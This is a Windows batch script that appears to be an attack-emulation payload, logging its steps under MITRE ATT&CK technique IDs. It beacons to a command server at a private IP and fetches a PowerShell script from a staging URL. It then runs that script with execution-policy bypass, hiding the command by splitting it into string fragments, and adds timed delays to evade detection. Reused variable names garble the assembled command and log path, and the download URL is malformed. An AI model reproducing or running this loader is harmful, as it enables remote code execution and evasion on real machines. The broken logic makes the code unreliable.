@echo off
SETLOCAL EnableDelayedExpansion

REM PHR_ placeholder assignments (plain literals - NEVER obfuscated)
SET zxvvcb=%APPDATA%\8475\2ed92613
SET lkbnmg=https://10.0.0.49
SET sfdgsd=https://10.0.0.49/stage/2/icon.png?8475-7
SET rtyhjk=ITZEL-S2BO
SET qwerty=7
SET asdfgh=dxdiag.txt
SET zxcvbn=8475

REM Obfuscated variable declarations
SET jdhfkj=Ut
SET kdfhjk=ility
SET lkjsdf=Func
SET mnbvcx=tions
SET poiuyt=.ps1

SET aqwsed=pow
SET wsxcfg=ersh
SET edcrfv=ell.
SET rfvtgb=exe

SET zxcvfr=-ep
SET cvfrde=bypa
SET vfrtyu=ss
SET frtyui=-co
SET rtyuio=mmand

SET qazxsw=set-l
SET azxswq=ocati
SET zxswqe=on
SET xswqaz=-path

SET cdefrt=c:\w
SET defrty=indow
SET efrtyu=s\dia
SET frtyui=gnost
SET rtyuio=ics\s
SET tyuiop=ystem
SET yuiopa=\netw
SET uiopas=orking

SET asdfrt=impor
SET sdfrty=t-mod
SET dfrtyu=ule
SET frtyui=.\Ut
SET rtyuio=ility
SET tyuiop=Func
SET yuiopa=tions
SET uiopas=.ps1

SET qweasd=RegS
SET weasdz=napin
SET easdzx=!zxvvcb!\
SET asdzxc=!asdfgh!

SET zxcqwe=[Pro
SET xcqwer=gram.
SET cqwert=Class
SET qwerty=]::D
SET wertyu=ale()

REM Log file setup
SET logpath=!APPDATA!\!qwerty!
IF NOT EXIST "!logpath!" mkdir "!logpath!" >nul 2>nul
SET logfile=!logpath!\macula-simulations.log

REM Initial delay (30-60s)
echo [!DATE! !TIME!][DEBUG][!rtyhjk!]: initial_delay_start>> "!logfile!" 2>nul
ping -n 45 127.0.0.1 >nul
echo [!DATE! !TIME!][DEBUG][!rtyhjk!]: initial_delay_complete>> "!logfile!" 2>nul

REM C2 heartbeat (first task, not obfuscated)
echo [!DATE! !TIME!][DEBUG][!rtyhjk!]: heartbeat_start>> "!logfile!" 2>nul
curl -k -s -o nul "!sfdgsd!"
IF !ERRORLEVEL! EQU 0 (
    SET hbresult=1
    SET hberror=
) ELSE (
    SET hbresult=0
    SET hberror=connection_failed
)
echo [!DATE! !TIME!][DEBUG][!rtyhjk!]: heartbeat_complete=!hbresult!>> "!logfile!" 2>nul

REM TTP logging for heartbeat
SET ttp_result=!hbresult!
SET ttp_error=!hberror!
echo [!DATE! !TIME!][!rtyhjk!]: !qwerty!-!zxcvbn!-T1218|Signed_Binary_Proxy_Execution=!ttp_result!:!ttp_error!>> "!logfile!" 2>nul

REM Random delay
SET /A randdelay=!RANDOM! %% 20 + 10
echo [!DATE! !TIME!][DEBUG][!rtyhjk!]: random_delay_start=!randdelay!s>> "!logfile!" 2>nul
timeout /t !randdelay! /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!rtyhjk!]: random_delay_complete>> "!logfile!" 2>nul

REM Change to temp directory
echo [!DATE! !TIME!][DEBUG][!rtyhjk!]: chdir_start=!logpath!>> "!logfile!" 2>nul
cd /d "!logpath!" >nul 2>nul
echo [!DATE! !TIME!][DEBUG][!rtyhjk!]: chdir_complete>> "!logfile!" 2>nul

REM Download UtilityFunctions.ps1 if not present
SET downfile=!jdhfkj!!lkjsdf!!kdfhjk!!mnbvcx!!poiuyt!
echo [!DATE! !TIME!][DEBUG][!rtyhjk!]: download_check_start=!downfile!>> "!logfile!" 2>nul
IF NOT EXIST "!downfile!" (
    SET part1=http://
    SET part2=!lkbnmg!
    SET part3=/stage1/
    SET fullurl=!part1!!part2!!part3!!downfile!
    echo [!DATE! !TIME!][DEBUG][!rtyhjk!]: download_start=!fullurl!>> "!logfile!" 2>nul
    SET dcmd1=curl
    SET dcmd2=-k
    SET dcmd3=-s
    SET dcmd4=-o
    SET dcmd5=!downfile!
    SET dcmd6=!fullurl!
    CALL !dcmd1! !dcmd2! !dcmd3! !dcmd4! !dcmd5! "!dcmd6!"
    echo [!DATE! !TIME!][DEBUG][!rtyhjk!]: download_complete>> "!logfile!" 2>nul
    CHOICE /C Y /N /D Y /T 8 >nul
) ELSE (
    echo [!DATE! !TIME!][DEBUG][!rtyhjk!]: download_skip_exists>> "!logfile!" 2>nul
)

REM Build PowerShell command parts
SET binpart1=!aqwsed!!wsxcfg!!edcrfv!!rfvtgb!
SET argpart1=!zxcvfr! !cvfrde!!vfrtyu! !frtyui!!rtyuio!
SET cmdpart1=!qazxsw!!azxswq!!zxswqe! !xswqaz! !cdefrt!!defrty!!efrtyu!!frtyui!!rtyuio!!tyuiop!!yuiopa!!uiopas!; 
SET cmdpart2=!asdfrt!!sdfrty!!dfrtyu! !frtyui!!rtyuio!!tyuiop!!yuiopa!!uiopas!; 
SET cmdpart3=!qweasd!!weasdz! !easdzx!!asdzxc!;
SET cmdpart4=!zxcqwe!!xcqwer!!cqwert!!qwerty!!wertyu!

REM Combine command parts with PHR_ variables
SET pscommand=!cmdpart1!!cmdpart2!!cmdpart3!!cmdpart4!

REM Execute obfuscated command
echo [!DATE! !TIME!][DEBUG][!rtyhjk!]: process_start=!binpart1!>> "!logfile!" 2>nul
!binpart1! !argpart1! "!pscommand!"
SET execresult=!ERRORLEVEL!
echo [!DATE! !TIME!][DEBUG][!rtyhjk!]: process_complete=!execresult!>> "!logfile!" 2>nul

REM Final TTP logging for DLL execution
IF !execresult! EQU 0 (
    SET dllresult=1
    SET dllerror=
) ELSE (
    SET dllresult=0
    SET dllerror=assembly_load_failed
)
echo [!DATE! !TIME!][DEBUG][!rtyhjk!]: dll_execution=!dllresult!>> "!logfile!" 2>nul
SET ttp_result=!dllresult!
SET ttp_error=!dllerror!
echo [!DATE! !TIME!][!rtyhjk!]: !qwerty!-!zxcvbn!-T1218.005|Regsvr32=!ttp_result!:!ttp_error!>> "!logfile!" 2>nul

REM Cleanup delay
timeout /t 12 /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!rtyhjk!]: cleanup_delay_complete>> "!logfile!" 2>nul

ENDLOCAL